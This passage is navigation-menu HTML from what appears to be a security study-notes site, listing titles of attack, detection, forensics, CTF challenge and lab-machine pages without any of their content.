    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-attacks-defense" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Attacks &amp; Defense
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Attacks & Defense">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-reproasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REProasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpp-passwords-group-policy-preferences" class="md-nav__link">
    <span class="md-ellipsis">
      GPP Passwords (Group Policy Preferences)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-permissionsgpo-files" class="md-nav__link">
    <span class="md-ellipsis">
      GPO Permissions/GPO Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-shares" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in Shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-object-properties" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in Object Properties
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      DCSync
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Golden Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-constrained-delegation" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberos Constrained Delegation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#print-spooler-ntlm-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      Print Spooler &amp; NTLM Relaying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#coercing-attacks-unconstrained-delegation" class="md-nav__link">
    <span class="md-ellipsis">
      Coercing Attacks &amp; Unconstrained Delegation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#object-acls" class="md-nav__link">
    <span class="md-ellipsis">
      Object ACLs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pki-esc1" class="md-nav__link">
    <span class="md-ellipsis">
      PKI - ESC1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#intro-to-network-traffic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Intro to Network Traffic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Intro to Network Traffic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcpdump-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      Tcpdump Fundamentals
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcpdump-packet-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Tcpdump Packet Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wireshark" class="md-nav__link">
    <span class="md-ellipsis">
      Wireshark
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#intermediate-network-traffic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Intermediate Network Traffic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Intermediate Network Traffic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#arp-spoofing-abnormality-detection" class="md-nav__link">
    <span class="md-ellipsis">
      ARP Spoofing &amp; Abnormality Detection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#arp-scanning-denial-of-service" class="md-nav__link">
    <span class="md-ellipsis">
      ARP Scanning &amp; Denial-of-Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#80211-denial-of-service" class="md-nav__link">
    <span class="md-ellipsis">
      802.11 Denial of Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rogue-access-point-evil-twin-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Rogue Access Point &amp; Evil-Twin Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fragmentation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Fragmentation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcp-handshake-abnormalities" class="md-nav__link">
    <span class="md-ellipsis">
      TCP Handshake Abnormalities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#httphttps-service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP/HTTPs Service Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strange-http-headers" class="md-nav__link">
    <span class="md-ellipsis">
      Strange HTTP Headers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssl-renegotiation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      SSL Renegotiation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strange-telnet-udp-connections" class="md-nav__link">
    <span class="md-ellipsis">
      Strange Telnet &amp; UDP Connections
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#working-with-idsips" class="md-nav__link">
    <span class="md-ellipsis">
      Working with IDS/IPS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Working with IDS/IPS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#suricata" class="md-nav__link">
    <span class="md-ellipsis">
      Suricata
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#suricata-rule-development-part-1" class="md-nav__link">
    <span class="md-ellipsis">
      Suricata Rule Development Part 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snort" class="md-nav__link">
    <span class="md-ellipsis">
      Snort
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#zeek" class="md-nav__link">
    <span class="md-ellipsis">
      Zeek
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-malware-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Malware Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Malware Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-internals" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Internals
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-on-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Static Analysis On Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#static-analysis-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Static Analysis On Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Dynamic Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Code Analysis
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#creating-detection-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Creating Detection Rules
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#javascript-deobfuscation" class="md-nav__link">
    <span class="md-ellipsis">
      JavaScript Deobfuscation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="JavaScript Deobfuscation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#deobfuscate" class="md-nav__link">
    <span class="md-ellipsis">
      Deobfuscate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#yara-sigma-for-soc-analysts" class="md-nav__link">
    <span class="md-ellipsis">
      YARA &amp; Sigma for SOC Analysts
    </span>
  </a>
  
    <nav class="md-nav" aria-label="YARA & Sigma for SOC Analysts">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#yara-and-yara-rules" class="md-nav__link">
    <span class="md-ellipsis">
      YARA and YARA Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#developing-yara-rule" class="md-nav__link">
    <span class="md-ellipsis">
      Developing YARA Rule
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-windows-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Windows Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-linux-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Linux Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-yara-web-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with YARA (Web Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sigma-and-sigma-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Sigma and Sigma Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#developing-sigma-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Developing Sigma Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-sigma-chainsaw-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with Sigma (Chainsaw Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hunting-evil-with-sigma-splunk-edition" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting Evil with Sigma (Splunk Edition)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_1" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-digital-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to Digital Forensics
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introduction to Digital Forensics">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#windows-forensics-overview" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Forensics Overview
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evidence-acquisition-techniques-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Evidence Acquisition Techniques &amp; Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memory-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Forensics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disk-forensics" class="md-nav__link">
    <span class="md-ellipsis">
      Disk Forensics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rapid-triage-examination-analysis-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Rapid Triage Examination &amp; Analysis Tools
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#practical-digital-forensics-scenario" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Digital Forensics Scenario
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_2" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detecting-windows-attacks-with-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Windows Attacks with Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Detecting Windows Attacks with Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#detecting-common-userdomain-recon" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Common User/Domain Recon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Password Spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-responder-like-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Responder-like Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberoastingas-reproasting" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberoasting/AS-REProasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Pass-the-Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Pass-the-Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-overpass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Overpass-the-Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-golden-ticketssilver-tickets" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Golden Tickets/Silver Tickets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-unconstrained-delegationconstrained-delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Unconstrained Delegation/Constrained Delegation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-dcsyncdcshadow" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting DCSync/DCShadow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-rdp-brute-force-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting RDP Brute Force Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-beaconing-malware" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Beaconing Malware
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-nmap-port-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Nmap Port Scanning
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberos-brute-force-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberos Brute Force Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-golden-tickets" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Golden Tickets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-cobalt-strikes-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Cobalt Strike's PSExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-zerologon" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Zerologon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-exfiltration-http" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Exfiltration (HTTP)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-exfiltration-dns" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Exfiltration (DNS)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-ransomware" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Ransomware
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment_3" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Web%20requests/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web requests
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Challenges
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Challenges
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/ApacheBlaze/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ApacheBlaze
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/C.O.P/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C.O.P
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/Distract%20and%20Destroy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Distract and Destroy (Blockchain)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/DoxPit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DoxPit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/Neonify/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Neonify
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/Oxidized%20ROP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Oxidized ROP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/PDFy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PDFy.md
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/Photon%20Lockdown/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Photon Lockdown (Hardware)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/ProxyAsAService/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ProxyAsAService
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/RenderQuest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RenderQuest
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/Watersnake/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Watersnake
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/baby%20website%20rick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    baby website rick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Challenges/jscalc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    jscalc
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          
          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Machines
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            Machines
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Aero/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Aero
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Arkham/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Arkham
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Axlle/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Axlle
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Blazorized/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blazorized
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Blurry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blurry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/BoardLight/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BoardLight
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Bucket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bucket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Celestial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Celestial
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Cereal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cereal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Compiled/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compiled
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Dog/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOG
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Editorial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Editorial - Season 5
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Escape/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Escape
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/FormulaX/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FormulaX - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/GreenHorn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GreenHorn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Headless/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Headless - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/IClean/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IClean - Released on 06 Apr 2024
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Intuition/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Intuition - Season 5
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Jab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Jab - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Mailing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mailing - Season 5
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Mist/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mist - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Monitored/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Monitored - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Office/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Office - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Outdated/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Outdated
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Perfection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Perfection - Season 4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/PermX/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PermX
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Popcorn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Popcorn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Runner/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Runner - Season 5
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Scrambled/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Scrambled
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Sea/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sea
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/SolarLab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SolarLab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/SteamCloud/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SteamCloud
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Usage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Usage - Released on 13 Apr 2024
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/Vault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vault
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Machines/WifineticTwo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WifineticTwo - Season 4
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/Change%20Mysql%20pw%20in%20Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Change root user's password in Mysql Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/Create%20multi%20shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Create multiple shells from one shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/File%20upload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File upload
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/Transfer%20file%20to%20local/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Transfer file from remote to local
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/VPN/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    VPN
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Notes/payloads%20for%20SSRF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    payloads for SSRF
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
            
  
  <span class="md-ellipsis">
    OSWE
  </span>
  

